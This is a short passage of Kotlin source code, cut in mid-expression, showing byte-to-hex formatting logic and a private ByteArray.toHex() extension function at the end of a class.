            "%02x".format(data[it].toInt() and 0xFF)
        }
    }

    private fun ByteArray.toHex(): String = joinToString("") { "%02x".format(it.toInt() and 0xFF) }
}
